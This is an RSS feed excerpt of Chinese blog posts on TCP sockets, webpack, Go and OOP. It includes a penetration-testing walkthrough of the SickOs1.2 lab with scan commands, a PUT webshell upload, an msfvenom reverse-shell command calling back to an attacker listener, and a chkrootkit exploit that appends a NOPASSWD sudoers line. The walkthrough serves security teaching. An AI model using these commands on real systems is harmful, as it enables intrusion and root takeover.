&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt;5、关闭套接字&lt;/span&gt;
tcpClientSocket.close()
&lt;/pre&gt;&lt;/div&gt;
&lt;p id=&quot;运行流程：&quot;&gt;&lt;strong&gt;运行流程：&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&quot;tcp客户端&quot;&gt;1、tcp客户端&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/751754/201905/751754-20190521153230629-1457045561.png&quot; alt=&quot;&quot; width=&quot;600&quot;/&gt;&lt;/p&gt;
&lt;h4 id=&quot;网络调试助手：&quot;&gt;2、网络调试助手：&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/751754/201905/751754-20190521153412707-1666077578.png&quot; alt=&quot;&quot; width=&quot;600&quot;/&gt;&lt;/p&gt;

</description>
<pubDate>Tue, 21 May 2019 16:56:00 +0000</pubDate>
<dc:creator>Se7eN_HOU</dc:creator>
<og:description>一、TCP简介 1、TCP介绍 TCP协议，传输控制协议（英语：Transmission Control Protocol，缩写为 TCP）是一种面向连接的、可靠的、基于字节流的传输层通信协议。 TC</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/Se7eN-HOU/p/10903528.html</dc:identifier>
</item>
<item>
<title>webpack学习（一）项目中安装webpack - 凡尘yang</title>
<link>http://www.cnblogs.com/yangboy/p/10903459.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/yangboy/p/10903459.html</guid>
<description>&lt;p&gt;&lt;span&gt;如何在项目中安装webpac，webpack-cli？&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;前提：电脑安装了 node和npm包管理工具&lt;/span&gt;&lt;br/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;1 创建项目文件夹或者在已有的项目中打开终端  输入相关命令：&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;   &lt;span&gt;npm init &lt;span&gt;&lt;br/&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;   &lt;span&gt;因为已经安装好了node 的 npm 包管理工具，使用npm 在项目中初始化，使得项目符合 node 规范。&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;&lt;span&gt;   根据终端提示一步一步输入后&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;&lt;span&gt;   这样项目文件夹中就会多出一个 package.json文件，一些项目的基本信息：项目名称，版本，描述和javascript脚本等。&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;&lt;span&gt;   可以添加比如下图中 &lt;/span&gt;&quot;private&quot;: true, &lt;span&gt;意思是项目是私有的，不会发布到npm的线上仓库。&lt;/span&gt;&lt;span&gt;也可以修改javascript脚本中的配置，比如原始打包命令可能是npx webpack index.js&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;&lt;span&gt;   配置 &lt;span&gt;&quot;bundle&quot;: &quot;webpack&quot; &lt;span&gt;打包的时候运行 &lt;span&gt;npm run bundle &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;&lt;span&gt;   &lt;img src=&quot;https://img2018.cnblogs.com/blog/1641685/201905/1641685-20190522000443216-1995591514.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;&lt;span&gt;   &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;2 项目中打开终端  输入相关命令：&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;   (1) 如果是全局安装，使用 &lt;span&gt;npm install webpack webpack-cli -g&lt;/span&gt;，检测是否安装成功 使用 &lt;span&gt;webpack -v /  webpack-cli&lt;/span&gt; -v&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　 但是很少有这样全局安装的，原因比如你有的项目使用的是webpack 3+的版本，而另一个项目使用的是webpack4+版本，他们互相之间是有冲突的。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;        当你需要打包3+项目的时候，你需要先卸载4+的webpack，然后使用3+的webpack打包。很费劲。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;  （2 菊部安装，不对，是局部安装，使用&lt;span&gt;npm install webpack webpack-cli -dev---sav&lt;/span&gt;e (等同于 &lt;span&gt;npm install webpack webpack-cli -D&lt;/span&gt;)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;         检测版本使用 &lt;span&gt;npx webpack -v &lt;span&gt;。一般默认是安装最新版本的webpack 如果想安装历史版本，可以先查看一下历史版本 使用 &lt;span&gt;npm info webpack &lt;span&gt;然后相应的安装。&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;&lt;span&gt;&lt;span&gt;&lt;span&gt;3 项目中打开终端 输入 &lt;span&gt;npm install&lt;/span&gt; 也可以把项目需要的依赖包都安装，运行完项目中会多处一个node_modules文件夹。&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;span&gt;&lt;span&gt;&lt;span&gt;&lt;span&gt;&lt;span&gt;这样在项目中加安装了webpack 打包工具。&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;

</description>
<pubDate>Tue, 21 May 2019 16:29:00 +0000</pubDate>
<dc:creator>凡尘yang</dc:creator>
<og:description>如何在项目中安装webpac，webpack-cli？ 前提：电脑安装了 node和npm包管理工具 1 创建项目文件夹或者在已有的项目中打开终端 输入相关命令： npm init 因为已经</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/yangboy/p/10903459.html</dc:identifier>
</item>
<item>
<title>kali渗透综合靶机(十二)--SickOs1.2靶机 - 雨中落叶</title>
<link>http://www.cnblogs.com/yuzly/p/10854392.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/yuzly/p/10854392.html</guid>
<description>&lt;p&gt;&lt;span&gt;kali渗透综合靶机(十二)--SickOs1.2靶机&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;靶机下载地址:https://www.vulnhub.com/entry/sickos-12,144/&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;span&gt;一、主机发现&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;1.netdiscover -i eth0 -r 192.168.10.0/24&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/1592114/201905/1592114-20190512231914416-1643221095.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;span&gt;二、端口扫描&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;1. masscan --rate=10000 -p0-65535 192.168.10.170&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/1592114/201905/1592114-20190512231928649-223068147.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;span&gt;三、端口服务识别&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;1. nmap -sV -T4 -O -p 22,80 192.168.10.170&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/1592114/201905/1592114-20190512231952597-422987217.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;span&gt;四、漏洞查找与利用&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;1.浏览器访问http://192.168.10.170,发现发现登录界面,尝试目录扫描,没发现有用信息&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/1592114/201905/1592114-20190512232006362-428783446.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;2.发现&lt;a href=&quot;http://192.168.10.170/test/&quot;&gt;http://192.168.10.170/test/&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/1592114/201905/1592114-20190512232020659-676184160.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;3.发现ssh的版本OpenSSH 5.9p1,存在用户枚举漏洞，用msf枚举用户得到用户John, root&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;4.使用hydra进行ssh爆破,没有破解出来&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;5.发现web服务的版本lighttpd 1.4.28&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;searchsploit lighttpd，搜索漏洞,发现没有什么可利用的漏洞&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/1592114/201905/1592114-20190512232125234-707737379.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;6. nmap 192.168.10.170 --script=http-methods.nse --script-args=http.methods.url-path=&quot;/test&quot;  扫描/test页面的支持的http方法&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/1592114/201905/1592114-20190512232151332-112436988.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;或者对/test页面抓包,然后修改请求头为OPTIONS查看支持的HTTP方法&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/1592114/201905/1592114-20190512232220338-1641015525.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;7. 上传了一个html文件进行测试，发现真的上传成功了（上传一个不存在的文件会响应201 Created）&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/1592114/201905/1592114-20190512232235916-315827207.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/1592114/201905/1592114-20190512232248227-855490632.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;Getshell方式一:&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;8.上传php一句话&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/1592114/201905/1592114-20190512232307029-93313578.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;9.菜刀连接一句话&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/1592114/201905/1592114-20190512232321402-1308956479.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;10.在菜刀中上传php反弹shell,反弹连接的IP以及端口,端口设置为443(防火墙阻止了非常用端口出去)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/1592114/201905/1592114-20190512232341645-1461135764.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/1592114/201905/1592114-20190512232352644-786270278.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/1592114/201905/1592114-20190512232402489-1581938034.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;11.查看系统版本和内核版本&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/1592114/201905/1592114-20190512232432711-1529008043.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;Getshell方式二:&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;1.Msfvenom生成一个反弹shell&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.10.168 LPORT=443 &amp;gt; shell_443.php&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;2.curl上传生成的反弹shell到目标&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/1592114/201905/1592114-20190512232501602-1314103422.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;3.Msf开启监听&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/1592114/201905/1592114-20190512232516394-2014690968.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;4.访问上传的shell&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/1592114/201905/1592114-20190512232534047-332011253.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;5.获得目标的shell&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/1592114/201905/1592114-20190512232544296-543356620.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;提权方式一:利用exp&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;1.查看系统是否存在chkrootkit,发现chkrootkit的版本为0.49&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/1592114/201905/1592114-20190512232603074-682548575.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;2. chkrootkit 0.49漏洞原理:chkrootkit有crontab，会定期以root身份执行/tmp/update文件。如果攻击者知道管理员是定期运行chkrootkit(通过查看cron.daily获知)，并且对/ tmp(没有挂载noexec)有写访问权限，就可以利用该漏洞获取root权限。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;漏洞利用: 于是我们可以利用这一点，在/tmp目录下新建update文件，做我们想让root帮我们做的事&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;touch /tmp/update&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;chmod +x /tmp/update&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;echo 'chmod +w /etc/sudoers &amp;amp;&amp;amp; echo &quot;www-data ALL=(ALL)NOPASSWD:ALL&quot; &amp;gt;&amp;gt; /etc/sudoers' &amp;gt; /tmp/update&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;sudo su root&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/1592114/201905/1592114-20190512232634388-1603391386.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;提权方式二:&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;1.exploit-database中对漏洞chkrootkit进行搜索&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/1592114/201905/1592114-20190512232658915-1232439541.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;2.msf中利用对应的漏洞结合已经获得的session&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/1592114/201905/1592114-20190512232717045-2138479228.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;3.使用exploit/unix/local/chkrootkit模块本地提权，设置参数&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/1592114/201905/1592114-20190512232739393-691074912.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;4.开始攻击，成功,获得管理员权限&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/1592114/201905/1592114-20190512232756027-493366273.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;提权方式三:&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;1.编写exp&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/1592114/201905/1592114-20190512232818073-24811917.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;2.上传exp到目标靶机&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/1592114/201905/1592114-20190512232834770-1114249875.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;3.把上传的脚本拷贝到/tmp目录下&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/1592114/201905/1592114-20190512232850452-1700458635.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;4.执行update,获得root权限&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/1592114/201905/1592114-20190512232903501-1493097017.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;


&lt;p&gt;&lt;span&gt;总结:&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;1、信息收集、端口扫描、服务识别、目录扫描&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;2、nmap 的http-methods.nse脚本获得目标支持的http方法,发现/test页面支持put方法&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;3、使用burp修改包，用put方法上传一句话或者curl 上传获得shell&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;4、利用chkrootkit版本0.49定期以root身份执行/tmp/update文件来提权。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　1.利用msf中chkrootkit攻击模块&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　2.手动创建在/tmp创建update文件,然后利用自动执行update文件,在update写入添加账户到sudo组&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　3.使用C语言编写exp,改变/tmp的所属组为root以及增加uid为root权限,上传都目标服务器,编译然后执行，提权成功。&lt;/span&gt;&lt;/p&gt;


</description>
<pubDate>Tue, 21 May 2019 16:09:00 +0000</pubDate>
<dc:creator>雨中落叶</dc:creator>
<og:description>kali渗透综合靶机(十二)--SickOs1.2靶机 靶机下载地址:https://www.vulnhub.com/entry/sickos-12,144/ 一、主机发现 1.netdiscover</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/yuzly/p/10854392.html</dc:identifier>
</item>
<item>
<title>如何开始学习Go语言 - 虫师</title>
<link>http://www.cnblogs.com/fnng/p/10903271.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/fnng/p/10903271.html</guid>
<description>&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/311516/201905/311516-20190521234015779-1383112903.gif&quot;/&gt;&lt;/p&gt;
&lt;p&gt;除了Java、Python和JavaScript之外，如果要开始学习一门新语言的话，我想应该是Go!&lt;/p&gt;
&lt;p&gt;Go语言正在被越来越多的公司使用。我们公司的后端服务已经全面采用Go语言实现了。&lt;/p&gt;
&lt;p&gt;最开始接触Go语言是去年将一份Go代码“翻译”成Python并集成到测试平台上，说来也挺神奇，我从来没学过Go却完成了这个工作，这也侧面反应了Go的语法还是很平易近人的。&lt;/p&gt;
&lt;p&gt;今年，调岗之后已经没有太多时间写代码了，但如果要开始学习一个新的语言或技术的话，我最想学的是Go！&lt;/p&gt;
&lt;p&gt;目前来看，Go似乎还并没有太多测试人员使用的场景，不过，我之前介绍过的BDD行为驱动框架gauge是由Go开发的，当然，它也支持使用Go来编写BDD测试代码。&lt;/p&gt;
&lt;p&gt;对于，已经有一定开发经验的同学，如何快速的开始学习Go语言呢？我这里给一些思路。&lt;/p&gt;

&lt;h4 id=&quot;第一步下载和安装&quot;&gt;第一步：下载和安装&lt;/h4&gt;
&lt;p&gt;下载地址：&lt;a href=&quot;https://studygolang.com/dl&quot; class=&quot;uri&quot;&gt;https://studygolang.com/dl&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;在配置环境的时候你需要重点了解GOROOT、GOPATH的作用。&lt;/p&gt;
&lt;p&gt;你还要准备一款称手的编辑器，如果你像我一样，一直都在使用VS Code的话，那么就它就可以了。&lt;/p&gt;

&lt;h4 id=&quot;第二步从hello-world开始&quot;&gt;第二步：从hello world开始&lt;/h4&gt;
&lt;p&gt;先运行一个hello world程序，认识Go语言的语法。&lt;/p&gt;
&lt;pre class=&quot;go&quot;&gt;
&lt;code&gt;package main
 
import (
    &quot;fmt&quot;
)
 
func main(){
    fmt.Println(&quot;helloworld!&quot;)
}&lt;/code&gt;
&lt;/pre&gt;

&lt;h4 id=&quot;第三步熟悉go的语法&quot;&gt;第三步：熟悉Go的语法&lt;/h4&gt;
&lt;p&gt;接下来，你可能要花一周左右的时间熟悉Go语言的语法。比如，变量定义、if/for、函数、Map、跨文件的程序调用…等，当然，还有一些Go特有的知识。&lt;/p&gt;
&lt;p&gt;我是看不进去厚厚的编程书，所以一般会找简单的教程。&lt;/p&gt;
&lt;p&gt;菜鸟教程：&lt;a href=&quot;https://www.runoob.com/go/go-tutorial.html&quot; class=&quot;uri&quot;&gt;https://www.runoob.com/go/go-tutorial.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;当然，我更喜欢看视频教程，虽然质量参差不齐，但我仍然觉得看视频比我自己看书更有效率。&lt;/p&gt;
&lt;p&gt;腾讯课堂：&lt;a href=&quot;https://ke.qq.com/course/list/go&quot; class=&quot;uri&quot;&gt;https://ke.qq.com/course/list/go&lt;/a&gt;&lt;br/&gt;网易云课堂：&lt;a href=&quot;https://study.163.com/courses-search?keyword=go&quot; class=&quot;uri&quot;&gt;https://study.163.com/courses-search?keyword=go&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;熟悉一段Go代码：&lt;/p&gt;
&lt;pre class=&quot;go&quot;&gt;
&lt;code&gt;package main
 
import&quot;fmt&quot;
 
func myFunc() {
    i := 0
    Here:   //这行的第一个词，以冒号结束作为标签
    fmt.Println(i)
    i++
    if i &amp;lt;10{
        goto Here   //跳转到Here去
    }
   
}

func main() {
    //调用函数
    myFunc()
}&lt;/code&gt;
&lt;/pre&gt;

&lt;h4 id=&quot;第四步go如何做单元测试&quot;&gt;第四步：Go如何做单元测试&lt;/h4&gt;
&lt;p&gt;针对Go做测试也非常简单。比如，这是一个被测试文件：add.go。&lt;/p&gt;
&lt;pre class=&quot;go&quot;&gt;
&lt;code&gt;package test_demo

func Add(a int, b int) int{
    return a + b
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;下面针对Add()函数编写测试用例，test_add.go&lt;/p&gt;
&lt;pre class=&quot;go&quot;&gt;
&lt;code&gt;package test_demo
 
import (
    &quot;testing&quot;
)
 
func TestAdd1(t *testing.T){
    r:= Add(1, 2)
    if r !=3{
        t.Errorf(&quot;Add(1, 2)failed. Got %d, expected 3.&quot;, r)
    }
 
}
 
func TestAdd2(t *testing.T){
    r:= Add(2, 2)
    if r !=4{
        t.Errorf(&quot;Add(2, 2)failed. Got %d, expected 4.&quot;, r)
    }
 
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;你只需要执行 &lt;code&gt;go test&lt;/code&gt; 命令就可以运行上面的测试了。&lt;/p&gt;

&lt;h4 id=&quot;第五步从哪儿找第三方库&quot;&gt;第五步：从哪儿找第三方库&lt;/h4&gt;
&lt;p&gt;当然，你只学习go语言本身，基本是做不了什么事的，必须要使用第三方扩展库。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://awesome-go.com/&quot; class=&quot;uri&quot;&gt;https://awesome-go.com/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;这里罗列了Go语言的第三方库，通过这些第三方库的介绍，我们也可以大概知道Go可以用来干什么。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://go-search.org/&quot; class=&quot;uri&quot;&gt;https://go-search.org/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;如果你知道库的名字的话，也可以在这个网站上搜索。&lt;/p&gt;
&lt;p&gt;据我了解，Go的第三方库大多都在GitHub上面。&lt;/p&gt;

&lt;h4 id=&quot;第六步用go做web开发&quot;&gt;第六步：用Go做Web开发&lt;/h4&gt;
&lt;p&gt;Go是静态语言，而且支持并发编程，所以，他有天然的性能优势，大多公司主要使用Go也是开发后端服务（即API）。&lt;/p&gt;
&lt;p&gt;终于到了实战阶段，如果我们真的要掌握一门语言，那么一定要用它来开发一个项目出来。这个过程大概需要一个月。&lt;/p&gt;
&lt;p&gt;Beego：&lt;a href=&quot;https://beego.me/&quot; class=&quot;uri&quot;&gt;https://beego.me/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Beego是Go下在主流的Web开发框架，资料相对比较丰富，而且有完善的文档。你可为此制定一个目标，比如用它来开发一个Blog，为此，你需要详细阅读Beego文档，以及学习相关的Web开发技术。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/311516/201905/311516-20190521234055717-551368170.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/311516/201905/311516-20190521234104934-287068000.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;等你完成这个项目的时候，我想你已经会使用Go语言了。&lt;/p&gt;
</description>
<pubDate>Tue, 21 May 2019 15:42:00 +0000</pubDate>
<dc:creator>虫师</dc:creator>
<og:description>go 语言学习思路！</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/fnng/p/10903271.html</dc:identifier>
</item>
<item>
<title>关于面向对象和面向过程本质的区别（个人感悟） - 风好大呀</title>
<link>http://www.cnblogs.com/pylearner/p/10903266.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/pylearner/p/10903266.html</guid>
<description>&lt;p&gt;&lt;span&gt;&lt;strong&gt;前言：&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;　　接触面向对象的概念也差不多两年了，对于面向对象也有着自己的一些感悟，期间也看到过面向过程的一些文章，但总是对于两种思想没有明确的区别概念，刚好今天在某篇博客上看到对于两者的区别。所以便写下这篇博客来记录下感悟。&lt;/p&gt;

&lt;p&gt;一、面向对象的特点&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　 &lt;strong&gt;&lt;span&gt;什么是对象，简单来说对象就是现实世界存在的任何事务都可以称之为对象，有着自己独特的个性。&lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;          &lt;span&gt;用思维导图来简洁表示一下就是这样：&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;　　　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/1639419/201905/1639419-20190521230506419-1855150581.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　　　&lt;span&gt;面向对象就是构成问题事务分解成各个对象，建立对象的目的不是为了完成一个步骤，而是为了描叙某个事物在整个解决问题的步骤中的行为。&lt;/span&gt;&lt;/p&gt;



&lt;p&gt;二、面向过程的特点&lt;/p&gt;
&lt;p&gt;　　&lt;span&gt;什么是过程，我认为过程就是步骤，是解决问题的按部就班。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　  面向过程用图片表示：&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/blog/1639419/201905/1639419-20190521231748531-554450079.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;　&lt;span&gt;　面向过程不同于面向对象，面向过程分析出解决问题所需要的步骤，然后用函数把这些步骤一步一步实现，使用的时候一个一个依次调用就可以了。&lt;/span&gt;&lt;/p&gt;

